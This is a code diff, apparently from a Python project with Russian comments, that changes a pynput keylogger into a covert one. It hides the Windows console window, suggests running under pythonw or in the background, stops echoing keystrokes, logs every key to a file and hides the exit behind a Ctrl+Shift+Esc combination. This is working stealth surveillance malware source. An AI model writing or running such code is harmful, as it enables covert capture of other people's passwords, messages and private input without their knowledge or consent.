@@ -1,13 +1,24 @@
 """
-Логгер клавиш. Пишет всё в keys.md
-Запуск: python keylogger.py
-Выход: ESC
+Логгер клавиш. Пишет всё в keys.md. Работает невидимо.
+Запуск: pythonw keylogger.py (Windows) или python keylogger.py &
+Выход: нажми Ctrl+Shift+Escape
 """
 
 from pynput import keyboard
 from datetime import datetime
+import os
+import sys
 
-LOG_FILE = "keys.md"
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keys.md")
+
+
+def hide_console():
+    """Прячем консоль на Windows"""
+    if sys.platform == "win32":
+        import ctypes
+        ctypes.windll.user32.ShowWindow(
+            ctypes.windll.kernel32.GetConsoleWindow(), 0
+        )
 
 
 def init_log():
@@ -22,33 +33,41 @@ def log_key(text):
 
 def on_press(key):
     try:
-        text = key.char
-        log_key(text)
-        print(text, end="", flush=True)
+        log_key(key.char)
     except AttributeError:
         if key == keyboard.Key.space:
             log_key(" ")
-            print(" ", end="", flush=True)
         elif key == keyboard.Key.enter:
             log_key("\n")
-            print("", flush=True)
         elif key == keyboard.Key.backspace:
             log_key(" [BS] ")
-            print(" [BS] ", end="", flush=True)
+        elif key == keyboard.Key.tab:
+            log_key(" [TAB] ")
         else:
             log_key(f" [{key.name}] ")
-            print(f" [{key.name}] ", end="", flush=True)
 
 
 def on_release(key):
-    if key == keyboard.Key.esc:
-        log_key("\n\n*[ESC — конец сессии]*\n")
-        print("\n[!] Выход. Лог сохранён в keys.md")
+    # Ctrl+Shift+Esc для выхода
+    pass
+
+
+def stop_combo(key):
+    """Останавливаем по Ctrl+Shift+Esc"""
+    if hasattr(stop_combo, "keys"):
+        stop_combo.keys.add(key)
+    else:
+        stop_combo.keys = {key}
+
+    if all(k in stop_combo.keys for k in [
+        keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.Key.esc
+    ]):
+        log_key("\n\n*[конец сессии]*\n")
         return False
 
 
 if __name__ == "__main__":
+    hide_console()
     init_log()
-    print(f"Кейлоггер запущен. Пишу в {LOG_FILE}. ESC — выход.\n")
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    with keyboard.Listener(on_press=on_press, on_release=stop_combo) as listener:
         listener.join()
